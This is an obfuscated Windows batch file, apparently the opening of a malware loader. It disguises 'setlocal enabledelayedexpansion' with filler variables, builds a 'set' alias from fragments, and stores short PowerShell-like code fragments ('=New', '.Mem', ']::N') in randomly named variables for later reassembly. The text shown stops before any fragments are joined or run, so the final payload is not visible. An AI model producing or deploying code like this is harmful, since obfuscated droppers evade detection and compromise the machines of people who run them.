@echo off
%VhuXBmmifpKCovbjdDyq%s%VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%t%VhuXBmmifpKCovbjdDyq%l%VhuXBmmifpKCovbjdDyq%o%VhuXBmmifpKCovbjdDyq%c%VhuXBmmifpKCovbjdDyq%a%VhuXBmmifpKCovbjdDyq%l%VhuXBmmifpKCovbjdDyq% %VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%n%VhuXBmmifpKCovbjdDyq%a%VhuXBmmifpKCovbjdDyq%b%VhuXBmmifpKCovbjdDyq%l%VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%d%VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%l%VhuXBmmifpKCovbjdDyq%a%VhuXBmmifpKCovbjdDyq%y%VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%d%VhuXBmmifpKCovbjdDyq%e%VhuXBmmifpKCovbjdDyq%x%VhuXBmmifpKCovbjdDyq%p%VhuXBmmifpKCovbjdDyq%a%VhuXBmmifpKCovbjdDyq%n%VhuXBmmifpKCovbjdDyq%s%VhuXBmmifpKCovbjdDyq%i%VhuXBmmifpKCovbjdDyq%o%VhuXBmmifpKCovbjdDyq%n%VhuXBmmifpKCovbjdDyq%
set "UBPbBXnkixfWCoQRntyX=s"
set "IKymDlwcEygIbjvLdGiQ=t"
set "ylcZRSaazKhvJNCRmVDB=!UBPbBXnkixfWCoQRntyX!e!IKymDlwcEygIbjvLdGiQ!"
!ylcZRSaazKhvJNCRmVDB! "qwRfSSNZaq=tor_"
!ylcZRSaazKhvJNCRmVDB! "DWRfqaMmfE=UI.W"
!ylcZRSaazKhvJNCRmVDB! "OhSlKEOBOu=ar[0"
!ylcZRSaazKhvJNCRmVDB! "DrSyckFNDX==New"
!ylcZRSaazKhvJNCRmVDB! "rSoRUHlfLV=ose("
!ylcZRSaazKhvJNCRmVDB! "ckAKACPLov=.Mem"
!ylcZRSaazKhvJNCRmVDB! "QlUfXixudz=x0h6"
!ylcZRSaazKhvJNCRmVDB! "dwzZovghSS=		$K"
!ylcZRSaazKhvJNCRmVDB! "gXhBXdGPDH=var="
!ylcZRSaazKhvJNCRmVDB! "HOPhwxgZAv=);	$"
!ylcZRSaazKhvJNCRmVDB! "mOmFsLPREP=M+Ad"
!ylcZRSaazKhvJNCRmVDB! "LFbMFOxyMJ=var."
!ylcZRSaazKhvJNCRmVDB! "PWPazLpHOZ=, 0,"
!ylcZRSaazKhvJNCRmVDB! "mHhdAgpwog=]::N"
!ylcZRSaazKhvJNCRmVDB! "mHvUBpJeds=);	$"
